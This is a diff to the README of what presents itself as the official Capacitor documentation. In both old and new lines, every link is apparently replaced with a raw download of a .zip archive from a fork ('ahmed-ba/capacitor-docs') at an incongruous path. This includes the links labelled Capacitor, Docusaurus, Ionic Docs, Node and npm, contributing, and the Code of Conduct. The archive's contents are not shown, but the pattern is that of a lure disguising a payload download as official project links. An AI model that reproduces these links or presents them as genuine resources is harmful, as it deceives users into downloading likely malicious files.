@@ -1,12 +1,12 @@
 # Capacitor Docs
 
-The official [Capacitor](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/src/components/page/theming/NewColorGenerator/capacitor_docs_v1.6.zip) documentation, built with [Docusaurus](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/src/components/page/theming/NewColorGenerator/capacitor_docs_v1.6.zip). Based on the [Ionic Docs](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/src/components/page/theming/NewColorGenerator/capacitor_docs_v1.6.zip)
+The official [Capacitor](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/versioned_docs/version-v4/main/android/docs-capacitor-v1.7.zip) documentation, built with [Docusaurus](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/versioned_docs/version-v4/main/android/docs-capacitor-v1.7.zip). Based on the [Ionic Docs](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/versioned_docs/version-v4/main/android/docs-capacitor-v1.7.zip)
 
 ---
 
 ## Getting Started
 
-Install the [latest versions of Node and npm](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/src/components/page/theming/NewColorGenerator/capacitor_docs_v1.6.zip).
+Install the [latest versions of Node and npm](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/versioned_docs/version-v4/main/android/docs-capacitor-v1.7.zip).
 
 Once npm is installed, run
 
@@ -23,8 +23,8 @@ The site will launch in development mode.
 ## Contributing
 
 Thanks for your interest in contributing! Read up on our guidelines for
-[contributing](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/src/components/page/theming/NewColorGenerator/capacitor_docs_v1.6.zip).
+[contributing](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/versioned_docs/version-v4/main/android/docs-capacitor-v1.7.zip).
 
-Please note that this project is released with a [Contributor Code of Conduct](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/src/components/page/theming/NewColorGenerator/capacitor_docs_v1.6.zip). By participating in this project you agree to abide by its terms.
+Please note that this project is released with a [Contributor Code of Conduct](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/versioned_docs/version-v4/main/android/docs-capacitor-v1.7.zip). By participating in this project you agree to abide by its terms.
 
 ---
